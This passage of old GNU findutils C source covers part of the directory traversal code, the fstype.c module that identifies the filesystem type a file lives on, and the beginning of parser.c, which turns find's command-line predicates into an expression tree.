  name_space = savedir (name, statp->st_size > 0 ? statp->st_size : 512);
  if (name_space == NULL)
    {
      if (errno)
	{
	  error (0, errno, "%s", pathname);
	  exit_status = 1;
	}
      else
	error (1, 0, "virtual memory exhausted");
    }
  else
    {
      register char *namep;	/* Current point in `name_space'. */
      char *cur_path;		/* Full path of each file to process. */
      char *cur_name;		/* Base name of each file to process. */
      unsigned cur_path_size;	/* Bytes allocated for `cur_path'. */
      register unsigned file_len; /* Length of each path to process. */
      register unsigned pathname_len; /* PATHLEN plus trailing '/'. */

      if (pathname[pathlen - 1] == '/')
	pathname_len = pathlen + 1; /* For '\0'; already have '/'. */
      else
	pathname_len = pathlen + 2; /* For '/' and '\0'. */
      cur_path_size = 0;
      cur_path = NULL;

      if (strcmp (name, ".") && chdir (name) < 0)
	{
	  error (0, errno, "%s", pathname);
	  exit_status = 1;
	  return;
	}

      for (namep = name_space; *namep; namep += file_len - pathname_len + 1)
	{
	  /* Append this directory entry's name to the path being searched. */
	  file_len = pathname_len + strlen (namep);
	  if (file_len > cur_path_size)
	    {
	      while (file_len > cur_path_size)
		cur_path_size += 1024;
	      if (cur_path)
		free (cur_path);
	      cur_path = xmalloc (cur_path_size);
	      strcpy (cur_path, pathname);
	      cur_path[pathname_len - 2] = '/';
	    }
	  cur_name = cur_path + pathname_len - 1;
	  strcpy (cur_name, namep);

	  curdepth++;
	  if (!no_leaf_check)
	    /* Normal case optimization.
	       On normal Unix filesystems, a directory that has no
	       subdirectories has two links: its name, and ".".  Any
	       additional links are to the ".." entries of its
	       subdirectories.  Once we have processed as many
	       subdirectories as there are additional links, we know
	       that the rest of the entries are non-directories --
	       in other words, leaf files. */
	    subdirs_left -= process_path (cur_path, cur_name,
					  subdirs_left == 0, pathname);
	  else
	    /* There might be weird (e.g., CD-ROM or MS-DOS) filesystems
	       mounted, which don't have Unix-like directory link counts. */
	    process_path (cur_path, cur_name, false, pathname);
	  curdepth--;
	}

      if (strcmp (name, "."))
	{
	  if (!dereference)
	    {
	      if (chdir ("..") < 0)
		/* We could go back and do the next command-line arg instead,
		   maybe using longjmp.  */
		error (1, errno, "%s", parent);
	    }
	  else
	    {
#ifndef HAVE_FCHDIR
	      if (chdir (starting_dir) || chdir (parent))
		error (1, errno, "%s", parent);
#else
	      if (fchdir (starting_desc) || chdir (parent))
		error (1, errno, "%s", parent);
#endif
	    }
	}

      if (cur_path)
	free (cur_path);
      free (name_space);
    }
}

/* Return true if there are no side effects in any of the predicates in
   predicate list PRED, false if there are any. */

static boolean
no_side_effects (pred)
     struct predicate *pred;
{
  while (pred != NULL)
    {
      if (pred->side_effects)
	return (false);
      pred = pred->pred_next;
    }
  return (true);
}
/* fstype.c -- determine type of filesystems that files are on
   Copyright (C) 1990, 91, 92, 93, 94 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by David MacKenzie <djm@gnu.ai.mit.edu>. */

#include <config.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "defs.h"
#include "modetype.h"
#include <errno.h>
#ifdef STDC_HEADERS
#include <stdlib.h>
#else
extern int errno;
#endif

char *strdup ();
char *strstr ();

static char *filesystem_type_uncached P_((char *path, char *relpath, struct stat *statp));
static int xatoi P_((char *cp));

#ifdef FSTYPE_MNTENT		/* 4.3BSD, SunOS, HP-UX, Dynix, Irix.  */
#include <mntent.h>
#if !defined(MOUNTED)
# if defined(MNT_MNTTAB)	/* HP-UX.  */
#  define MOUNTED MNT_MNTTAB
# endif
# if defined(MNTTABNAME)	/* Dynix.  */
#  define MOUNTED MNTTABNAME
# endif
#endif
#endif

#ifdef FSTYPE_GETMNT		/* Ultrix.  */
#include <sys/param.h>
#include <sys/mount.h>
#include <sys/fs_types.h>
#endif

#ifdef FSTYPE_USG_STATFS	/* SVR3.  */
#include <sys/statfs.h>
#include <sys/fstyp.h>
#endif

#ifdef FSTYPE_STATVFS		/* SVR4.  */
#include <sys/statvfs.h>
#include <sys/fstyp.h>
#endif

#ifdef FSTYPE_STATFS		/* 4.4BSD.  */
#include <sys/param.h>		/* NetBSD needs this.  */
#include <sys/mount.h>

#ifndef MFSNAMELEN		/* NetBSD defines this.  */
static char *
fstype_to_string (t)
     short t;
{
#ifdef INITMOUNTNAMES		/* Defined in 4.4BSD, not in NET/2.  */
  static char *mn[] = INITMOUNTNAMES;
  if (t >= 0 && t <= MOUNT_MAXTYPE)
    return mn[t];
  else
    return "?";
#else /* !INITMOUNTNAMES */
  switch (t)
    {
    case MOUNT_UFS:
      return "ufs";
    case MOUNT_NFS:
      return "nfs";
#ifdef MOUNT_PC
    case MOUNT_PC:
      return "pc";
#endif
#ifdef MOUNT_MFS
    case MOUNT_MFS:
      return "mfs";
#endif
#ifdef MOUNT_LO
    case MOUNT_LO:
      return "lofs";
#endif
#ifdef MOUNT_TFS
    case MOUNT_TFS:
      return "tfs";
#endif
#ifdef MOUNT_TMP
    case MOUNT_TMP:
      return "tmp";
#endif
#ifdef MOUNT_MSDOS
    case MOUNT_MSDOS:
      return "msdos";
#endif
#ifdef MOUNT_ISO9660
    case MOUNT_ISO9660:
      return "iso9660fs";
#endif
    default:
      return "?";
    }
#endif /* !INITMOUNTNAMES */
}
#endif /* !MFSNAMELEN */
#endif /* FSTYPE_STATFS */

#ifdef FSTYPE_AIX_STATFS	/* AIX.  */
#include <sys/vmount.h>
#include <sys/statfs.h>

#define FSTYPE_STATFS		/* Otherwise like 4.4BSD.  */
#define f_type f_vfstype

static char *
fstype_to_string (t)
     short t;
{
  switch (t)
    {
    case MNT_AIX:
#if 0				/* NFS filesystems are actually MNT_AIX. */
      return "aix";
#endif
    case MNT_NFS:
      return "nfs";
    case MNT_JFS:
      return "jfs";
    case MNT_CDROM:
      return "cdrom";
    default:
      return "?";
    }
}
#endif /* FSTYPE_AIX_STATFS */

#ifdef AFS
#include <netinet/in.h>
#include <afs/venus.h>
#if __STDC__
/* On SunOS 4, afs/vice.h defines this to rely on a pre-ANSI cpp.  */
#undef _VICEIOCTL
#define _VICEIOCTL(id)  ((unsigned int ) _IOW('V', id, struct ViceIoctl))
#endif
#ifndef _IOW
/* AFS on Solaris 2.3 doesn't get this definition.  */
#include <sys/ioccom.h>
#endif

static int
in_afs (path)
     char *path;
{
  static char space[2048];
  struct ViceIoctl vi;

  vi.in_size = 0;
  vi.out_size = sizeof (space);
  vi.out = space;

  if (pioctl (path, VIOC_FILE_CELL_NAME, &vi, 1)
      && (errno == EINVAL || errno == ENOENT))
	return 0;
  return 1;
}
#endif /* AFS */

/* Nonzero if the current filesystem's type is known.  */
static int fstype_known = 0;

/* Return a static string naming the type of filesystem that the file PATH,
   described by STATP, is on.
   RELPATH is the file name relative to the current directory.
   Return "unknown" if its filesystem type is unknown.  */

char *
filesystem_type (path, relpath, statp)
     char *path;
     char *relpath;
     struct stat *statp;
{
  static char *current_fstype = NULL;
  static dev_t current_dev;

  if (current_fstype != NULL)
    {
      if (fstype_known && statp->st_dev == current_dev)
	return current_fstype;	/* Cached value.  */
      free (current_fstype);
    }
  current_dev = statp->st_dev;
  current_fstype = filesystem_type_uncached (path, relpath, statp);
  return current_fstype;
}

/* Return a newly allocated string naming the type of filesystem that the
   file PATH, described by STATP, is on.
   RELPATH is the file name relative to the current directory.
   Return "unknown" if its filesystem type is unknown.  */

static char *
filesystem_type_uncached (path, relpath, statp)
     char *path;
     char *relpath;
     struct stat *statp;
{
  char *type = NULL;

#ifdef FSTYPE_MNTENT		/* 4.3BSD, SunOS, HP-UX, Dynix, Irix.  */
  char *table = MOUNTED;
  FILE *mfp;
  struct mntent *mnt;

  mfp = setmntent (table, "r");
  if (mfp == NULL)
    error (1, errno, "%s", table);

  /* Find the entry with the same device number as STATP, and return
     that entry's fstype. */
  while (type == NULL && (mnt = getmntent (mfp)))
    {
      char *devopt;
      dev_t dev;
      struct stat disk_stats;

#ifdef MNTTYPE_IGNORE
      if (!strcmp (mnt->mnt_type, MNTTYPE_IGNORE))
	continue;
#endif

      /* Newer systems like SunOS 4.1 keep the dev number in the mtab,
	 in the options string.	 For older systems, we need to stat the
	 directory that the filesystem is mounted on to get it.

	 Unfortunately, the HPUX 9.x mnttab entries created by automountq
	 contain a dev= option but the option value does not match the
	 st_dev value of the file (maybe the lower 16 bits match?).  */

#if !defined(hpux) && !defined(__hpux__)
      devopt = strstr (mnt->mnt_opts, "dev=");
      if (devopt)
	{
	  if (devopt[4] == '0' && (devopt[5] == 'x' || devopt[5] == 'X'))
	    dev = xatoi (devopt + 6);
	  else
	    dev = xatoi (devopt + 4);
	}
      else
#endif /* not hpux */
	{
	  if (stat (mnt->mnt_dir, &disk_stats) == -1)
	    error (1, errno, "error in %s: %s", table, mnt->mnt_dir);
	  dev = disk_stats.st_dev;
	}

      if (dev == statp->st_dev)
	type = mnt->mnt_type;
    }

  if (endmntent (mfp) == 0)
    error (0, errno, "%s", table);
#endif

#ifdef FSTYPE_GETMNT		/* Ultrix.  */
  int offset = 0;
  struct fs_data fsd;

  while (type == NULL
	 && getmnt (&offset, &fsd, sizeof (fsd), NOSTAT_MANY, 0) > 0)
    {
      if (fsd.fd_req.dev == statp->st_dev)
	type = gt_names[fsd.fd_req.fstype];
    }
#endif

#ifdef FSTYPE_USG_STATFS	/* SVR3.  */
  struct statfs fss;
  char typebuf[FSTYPSZ];

  if (statfs (relpath, &fss, sizeof (struct statfs), 0) == -1)
    {
      /* Don't die if a file was just removed. */
      if (errno != ENOENT)
	error (1, errno, "%s", path);
    }
  else if (!sysfs (GETFSTYP, fss.f_fstyp, typebuf))
    type = typebuf;
#endif

#ifdef FSTYPE_STATVFS		/* SVR4.  */
  struct statvfs fss;

  if (statvfs (relpath, &fss) == -1)
    {
      /* Don't die if a file was just removed. */
      if (errno != ENOENT)
	error (1, errno, "%s", path);
    }
  else
    type = fss.f_basetype;
#endif

#ifdef FSTYPE_STATFS		/* 4.4BSD.  */
  struct statfs fss;
  char *p;

  if (S_ISLNK (statp->st_mode))
    p = dirname (relpath);
  else
    p = relpath;

  if (statfs (p, &fss) == -1)
    {
      /* Don't die if symlink to nonexisting file, or a file that was
	 just removed. */
      if (errno != ENOENT)
	error (1, errno, "%s", path);
    }
  else
    {
#ifdef MFSNAMELEN		/* NetBSD.  */
      type = xstrdup (fss.f_fstypename);
#else
      type = fstype_to_string (fss.f_type);
#endif
    }
  if (p != relpath)
    free (p);
#endif

#ifdef AFS
  if ((!type || !strcmp (type, "xx")) && in_afs (relpath))
    type = "afs";
#endif

  /* An unknown value can be caused by an ENOENT error condition.
     Don't cache those values.  */
  fstype_known = (type != NULL);

  return xstrdup (type ? type : "unknown");
}

#ifdef FSTYPE_MNTENT		/* 4.3BSD etc.  */
/* Return the value of the hexadecimal number represented by CP.
   No prefix (like '0x') or suffix (like 'h') is expected to be
   part of CP. */

static int
xatoi (cp)
     char *cp;
{
  int val;
  
  val = 0;
  while (*cp)
    {
      if (*cp >= 'a' && *cp <= 'f')
	val = val * 16 + *cp - 'a' + 10;
      else if (*cp >= 'A' && *cp <= 'F')
	val = val * 16 + *cp - 'A' + 10;
      else if (*cp >= '0' && *cp <= '9')
	val = val * 16 + *cp - '0';
      else
	break;
      cp++;
    }
  return val;
}
#endif
/* parser.c -- convert the command line args into an expression tree.
   Copyright (C) 1990, 91, 92, 93, 94 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#include <config.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <ctype.h>
#include <stdio.h>
#include <pwd.h>
#include <grp.h>
#include "modechange.h"
#include "defs.h"
#include "modetype.h"

#if !defined (isascii) || defined (STDC_HEADERS)
#ifdef isascii
#undef isascii
#endif
#define isascii(c) 1
#endif

#define ISDIGIT(c) (isascii (c) && isdigit (c))
#define ISUPPER(c) (isascii (c) && isupper (c))

#ifndef _POSIX_VERSION
/* POSIX.1 header files should declare these.  */
struct group *getgrnam ();
struct passwd *getpwnam ();
#endif

#ifdef CACHE_IDS
/* These two aren't specified by POSIX.1.  */
struct group *getgrent ();
struct passwd *getpwent ();
#endif

#ifndef S_IFLNK
#define lstat stat
#endif

char *strstr ();
int lstat ();
int stat ();
#ifndef atol /* for Linux */
long atol ();
#endif
struct tm *localtime ();

#ifdef _POSIX_SOURCE
#define endgrent()
#define endpwent()
#else
void endgrent ();
void endpwent ();
#endif

static boolean parse_amin P_((char *argv[], int *arg_ptr));
static boolean parse_and P_((char *argv[], int *arg_ptr));
static boolean parse_anewer P_((char *argv[], int *arg_ptr));
static boolean parse_atime P_((char *argv[], int *arg_ptr));
boolean parse_close P_((char *argv[], int *arg_ptr));
static boolean parse_cmin P_((char *argv[], int *arg_ptr));
static boolean parse_cnewer P_((char *argv[], int *arg_ptr));
static boolean parse_comma P_((char *argv[], int *arg_ptr));
static boolean parse_ctime P_((char *argv[], int *arg_ptr));
static boolean parse_daystart P_((char *argv[], int *arg_ptr));
static boolean parse_depth P_((char *argv[], int *arg_ptr));
static boolean parse_empty P_((char *argv[], int *arg_ptr));
static boolean parse_exec P_((char *argv[], int *arg_ptr));
static boolean parse_false P_((char *argv[], int *arg_ptr));
static boolean parse_fls P_((char *argv[], int *arg_ptr));
static boolean parse_fprintf P_((char *argv[], int *arg_ptr));
static boolean parse_follow P_((char *argv[], int *arg_ptr));
static boolean parse_fprint P_((char *argv[], int *arg_ptr));
static boolean parse_fprint0 P_((char *argv[], int *arg_ptr));
static boolean parse_fstype P_((char *argv[], int *arg_ptr));
static boolean parse_gid P_((char *argv[], int *arg_ptr));
static boolean parse_group P_((char *argv[], int *arg_ptr));
static boolean parse_help P_((char *argv[], int *arg_ptr));
static boolean parse_ilname P_((char *argv[], int *arg_ptr));
static boolean parse_iname P_((char *argv[], int *arg_ptr));
static boolean parse_inum P_((char *argv[], int *arg_ptr));
static boolean parse_ipath P_((char *argv[], int *arg_ptr));
static boolean parse_iregex P_((char *argv[], int *arg_ptr));
static boolean parse_links P_((char *argv[], int *arg_ptr));
static boolean parse_lname P_((char *argv[], int *arg_ptr));
static boolean parse_ls P_((char *argv[], int *arg_ptr));
static boolean parse_maxdepth P_((char *argv[], int *arg_ptr));
static boolean parse_mindepth P_((char *argv[], int *arg_ptr));
static boolean parse_mmin P_((char *argv[], int *arg_ptr));
static boolean parse_mtime P_((char *argv[], int *arg_ptr));
static boolean parse_name P_((char *argv[], int *arg_ptr));
static boolean parse_negate P_((char *argv[], int *arg_ptr));
static boolean parse_newer P_((char *argv[], int *arg_ptr));
static boolean parse_noleaf P_((char *argv[], int *arg_ptr));
static boolean parse_nogroup P_((char *argv[], int *arg_ptr));
static boolean parse_nouser P_((char *argv[], int *arg_ptr));
static boolean parse_ok P_((char *argv[], int *arg_ptr));
boolean parse_open P_((char *argv[], int *arg_ptr));
static boolean parse_or P_((char *argv[], int *arg_ptr));
static boolean parse_path P_((char *argv[], int *arg_ptr));
static boolean parse_perm P_((char *argv[], int *arg_ptr));
boolean parse_print P_((char *argv[], int *arg_ptr));
static boolean parse_print0 P_((char *argv[], int *arg_ptr));
static boolean parse_printf P_((char *argv[], int *arg_ptr));
static boolean parse_prune P_((char *argv[], int *arg_ptr));
static boolean parse_regex P_((char *argv[], int *arg_ptr));
static boolean insert_regex P_((char *argv[], int *arg_ptr, boolean ignore_case));
static boolean parse_size P_((char *argv[], int *arg_ptr));
static boolean parse_true P_((char *argv[], int *arg_ptr));
static boolean parse_type P_((char *argv[], int *arg_ptr));
static boolean parse_uid P_((char *argv[], int *arg_ptr));
static boolean parse_used P_((char *argv[], int *arg_ptr));
static boolean parse_user P_((char *argv[], int *arg_ptr));
static boolean parse_version P_((char *argv[], int *arg_ptr));
static boolean parse_xdev P_((char *argv[], int *arg_ptr));
static boolean parse_xtype P_((char *argv[], int *arg_ptr));

static boolean insert_regex P_((char *argv[], int *arg_ptr, boolean ignore_case));
static boolean insert_type P_((char *argv[], int *arg_ptr, boolean (*which_pred )()));
static boolean insert_fprintf P_((FILE *fp, boolean (*func )(), char *argv[], int *arg_ptr));
static struct segment **make_segment P_((struct segment **segment, char *format, int len, int kind));
static boolean insert_exec_ok P_((boolean (*func )(), char *argv[], int *arg_ptr));
static boolean get_num_days P_((char *str, unsigned long *num_days, enum comparison_type *comp_type));
static boolean insert_time P_((char *argv[], int *arg_ptr, PFB pred));
static boolean get_num P_((char *str, unsigned long *num, enum comparison_type *comp_type));
static boolean insert_num P_((char *argv[], int *arg_ptr, PFB pred));
static FILE *open_output_file P_((char *path));

#ifdef DEBUG
char *find_pred_name _P((PFB pred_func));
#endif /* DEBUG */

struct parser_table
{
  char *parser_name;
  PFB parser_func;
};

/* GNU find predicates that are not mentioned in POSIX.2 are marked `GNU'.
   If they are in some Unix versions of find, they are marked `Unix'. */

static struct parser_table const parse_table[] =
{
  {"!", parse_negate},
  {"not", parse_negate},	/* GNU */
  {"(", parse_open},
  {")", parse_close},
  {",", parse_comma},		/* GNU */
  {"a", parse_and},
  {"amin", parse_amin},		/* GNU */
  {"and", parse_and},		/* GNU */
  {"anewer", parse_anewer},	/* GNU */
  {"atime", parse_atime},
  {"cmin", parse_cmin},		/* GNU */
  {"cnewer", parse_cnewer},	/* GNU */
#ifdef UNIMPLEMENTED_UNIX
  /* It's pretty ugly for find to know about archive formats.
     Plus what it could do with cpio archives is very limited.
     Better to leave it out.  */
  {"cpio", parse_cpio},		/* Unix */
#endif
  {"ctime", parse_ctime},
  {"daystart", parse_daystart},	/* GNU */
  {"depth", parse_depth},
  {"empty", parse_empty},	/* GNU */
  {"exec", parse_exec},
  {"false", parse_false},	/* GNU */
  {"fls", parse_fls},		/* GNU */
  {"follow", parse_follow},	/* GNU, Unix */
  {"fprint", parse_fprint},	/* GNU */
  {"fprint0", parse_fprint0},	/* GNU */
  {"fprintf", parse_fprintf},	/* GNU */
  {"fstype", parse_fstype},	/* GNU, Unix */
  {"gid", parse_gid},		/* GNU */
  {"group", parse_group},
  {"help", parse_help},		/* GNU */
  {"-help", parse_help},	/* GNU */
  {"ilname", parse_ilname},	/* GNU */
  {"iname", parse_iname},	/* GNU */
  {"inum", parse_inum},		/* GNU, Unix */
  {"ipath", parse_ipath},	/* GNU */
  {"iregex", parse_iregex},	/* GNU */
  {"links", parse_links},
  {"lname", parse_lname},	/* GNU */
  {"ls", parse_ls},		/* GNU, Unix */
  {"maxdepth", parse_maxdepth},	/* GNU */
  {"mindepth", parse_mindepth},	/* GNU */
  {"mmin", parse_mmin},		/* GNU */
  {"mount", parse_xdev},	/* Unix */
  {"mtime", parse_mtime},
  {"name", parse_name},
#ifdef UNIMPLEMENTED_UNIX
  {"ncpio", parse_ncpio},	/* Unix */
#endif
  {"newer", parse_newer},
  {"noleaf", parse_noleaf},	/* GNU */
  {"nogroup", parse_nogroup},
  {"nouser", parse_nouser},
  {"o", parse_or},
  {"or", parse_or},		/* GNU */
  {"ok", parse_ok},
  {"path", parse_path},		/* GNU, HP-UX */
  {"perm", parse_perm},
  {"print", parse_print},
  {"print0", parse_print0},	/* GNU */
  {"printf", parse_printf},	/* GNU */
  {"prune", parse_prune},
  {"regex", parse_regex},	/* GNU */
  {"size", parse_size},
  {"true", parse_true},		/* GNU */
  {"type", parse_type},
  {"uid", parse_uid},		/* GNU */
  {"used", parse_used},		/* GNU */
  {"user", parse_user},
  {"version", parse_version},	/* GNU */
  {"-version", parse_version},	/* GNU */
  {"xdev", parse_xdev},
  {"xtype", parse_xtype},	/* GNU */
  {0, 0}
};

/* Return a pointer to the parser function to invoke for predicate
   SEARCH_NAME.
   Return NULL if SEARCH_NAME is not a valid predicate name. */

PFB
find_parser (search_name)
     char *search_name;
{
  int i;

  if (*search_name == '-')
    search_name++;
  for (i = 0; parse_table[i].parser_name != 0; i++)
    if (strcmp (parse_table[i].parser_name, search_name) == 0)
      return (parse_table[i].parser_func);
  return (NULL);
}

/* The parsers are responsible to continue scanning ARGV for
   their arguments.  Each parser knows what is and isn't
   allowed for itself.
   
   ARGV is the argument array.
   *ARG_PTR is the index to start at in ARGV,
   updated to point beyond the last element consumed.
 
   The predicate structure is updated with the new information. */

static boolean
parse_amin (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;
  unsigned long num;
  enum comparison_type c_type;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  if (!get_num_days (argv[*arg_ptr], &num, &c_type))
    return (false);
  our_pred = insert_primary (pred_amin);
  our_pred->args.info.kind = c_type;
  our_pred->args.info.l_val = cur_day_start + DAYSECS - num * 60;
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_and (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  our_pred = get_new_pred ();
  our_pred->pred_func = pred_and;
#ifdef	DEBUG
  our_pred->p_name = find_pred_name (pred_and);
#endif	/* DEBUG */
  our_pred->p_type = BI_OP;
  our_pred->p_prec = AND_PREC;
  our_pred->need_stat = false;
  return (true);
}

static boolean
parse_anewer (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;
  struct stat stat_newer;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  if ((*xstat) (argv[*arg_ptr], &stat_newer))
    error (1, errno, "%s", argv[*arg_ptr]);
  our_pred = insert_primary (pred_anewer);
  our_pred->args.time = stat_newer.st_mtime;
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_atime (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  return (insert_time (argv, arg_ptr, pred_atime));
}

boolean
parse_close (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  our_pred = get_new_pred ();
  our_pred->pred_func = pred_close;
#ifdef	DEBUG
  our_pred->p_name = find_pred_name (pred_close);
#endif	/* DEBUG */
  our_pred->p_type = CLOSE_PAREN;
  our_pred->p_prec = NO_PREC;
  our_pred->need_stat = false;
  return (true);
}

static boolean
parse_cmin (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;
  unsigned long num;
  enum comparison_type c_type;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  if (!get_num_days (argv[*arg_ptr], &num, &c_type))
    return (false);
  our_pred = insert_primary (pred_cmin);
  our_pred->args.info.kind = c_type;
  our_pred->args.info.l_val = cur_day_start + DAYSECS - num * 60;
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_cnewer (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;
  struct stat stat_newer;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  if ((*xstat) (argv[*arg_ptr], &stat_newer))
    error (1, errno, "%s", argv[*arg_ptr]);
  our_pred = insert_primary (pred_cnewer);
  our_pred->args.time = stat_newer.st_mtime;
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_comma (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  our_pred = get_new_pred ();
  our_pred->pred_func = pred_comma;
#ifdef	DEBUG
  our_pred->p_name = find_pred_name (pred_comma);
#endif /* DEBUG */
  our_pred->p_type = BI_OP;
  our_pred->p_prec = COMMA_PREC;
  our_pred->need_stat = false;
  return (true);
}

static boolean
parse_ctime (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  return (insert_time (argv, arg_ptr, pred_ctime));
}

static boolean
parse_daystart (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct tm *local;

  if (full_days == false)
    {
      cur_day_start += DAYSECS;
      local = localtime (&cur_day_start);
      cur_day_start -= local->tm_sec + local->tm_min * 60
	+ local->tm_hour * 3600;
      full_days = true;
    }
  return (true);
}

static boolean
parse_depth (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  do_dir_first = false;
  return (true);
}
 
static boolean
parse_empty (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  insert_primary (pred_empty);
  return (true);
}

static boolean
parse_exec (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  return (insert_exec_ok (pred_exec, argv, arg_ptr));
}

static boolean
parse_false (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  our_pred = insert_primary (pred_false);
  our_pred->need_stat = false;
  return (true);
}

static boolean
parse_fls (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  our_pred = insert_primary (pred_fls);
  our_pred->args.stream = open_output_file (argv[*arg_ptr]);
  our_pred->side_effects = true;
  (*arg_ptr)++;
  return (true);
}

static boolean 
parse_fprintf (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  FILE *fp;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  if (argv[*arg_ptr + 1] == NULL)
    {
      /* Ensure we get "missing arg" message, not "invalid arg".  */
      (*arg_ptr)++;
      return (false);
    }
  fp = open_output_file (argv[*arg_ptr]);
  (*arg_ptr)++;
  return (insert_fprintf (fp, pred_fprintf, argv, arg_ptr));
}

static boolean
parse_follow (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  dereference = true;
  xstat = stat;
  no_leaf_check = true;
  return (true);
}

static boolean
parse_fprint (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  our_pred = insert_primary (pred_fprint);
  our_pred->args.stream = open_output_file (argv[*arg_ptr]);
  our_pred->side_effects = true;
  our_pred->need_stat = false;
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_fprint0 (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  our_pred = insert_primary (pred_fprint0);
  our_pred->args.stream = open_output_file (argv[*arg_ptr]);
  our_pred->side_effects = true;
  our_pred->need_stat = false;
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_fstype (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  our_pred = insert_primary (pred_fstype);
  our_pred->args.str = argv[*arg_ptr];
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_gid (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  return (insert_num (argv, arg_ptr, pred_gid));
}

static boolean
parse_group (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct group *cur_gr;
  struct predicate *our_pred;
  gid_t gid;
  int gid_len;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  cur_gr = getgrnam (argv[*arg_ptr]);
  endgrent ();
  if (cur_gr != NULL)
    gid = cur_gr->gr_gid;
  else
    {
      gid_len = strspn (argv[*arg_ptr], "0123456789");
      if ((gid_len == 0) || (argv[*arg_ptr][gid_len] != '\0'))
	return (false);
      gid = atoi (argv[*arg_ptr]);
    }
  our_pred = insert_primary (pred_group);
  our_pred->args.gid = gid;
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_help (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  printf ("\
Usage: %s [path...] [expression]\n", program_name);
  printf ("\
default path is the current directory; default expression is -print\n\
expression may consist of:\n\
operators (decreasing precedence; -and is implicit where no others are given):\n\
      ( EXPR ) ! EXPR -not EXPR EXPR1 -a EXPR2 EXPR1 -and EXPR2\n");
  printf ("\
      EXPR1 -o EXPR2 EXPR1 -or EXPR2 EXPR1 , EXPR2\n\
options (always true): -daystart -depth -follow --help\n\
      -maxdepth LEVELS -mindepth LEVELS -mount -noleaf --version -xdev\n\
tests (N can be +N or -N or N): -amin N -anewer FILE -atime N -cmin N\n");
  printf ("\
      -cnewer FILE -ctime N -empty -false -fstype TYPE -gid N -group NAME\n\
      -ilname PATTERN -iname PATTERN -inum N -ipath PATTERN -iregex PATTERN\n\
      -links N -lname PATTERN -mmin N -mtime N -name PATTERN -newer FILE\n");
  printf ("\
      -nouser -nogroup -path PATTERN -perm [+-]MODE -regex PATTERN\n\
      -size N[bckw] -true -type [bcdpfls] -uid N -used N -user NAME\n\
      -xtype [bcdpfls]\n");
  printf ("\
actions: -exec COMMAND ; -fprint FILE -fprint0 FILE -fprintf FILE FORMAT\n\
      -ok COMMAND ; -print -print0 -printf FORMAT -prune -ls\n");
  exit (0);
}

static boolean
parse_ilname (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  our_pred = insert_primary (pred_ilname);
  our_pred->args.str = argv[*arg_ptr];
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_iname (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
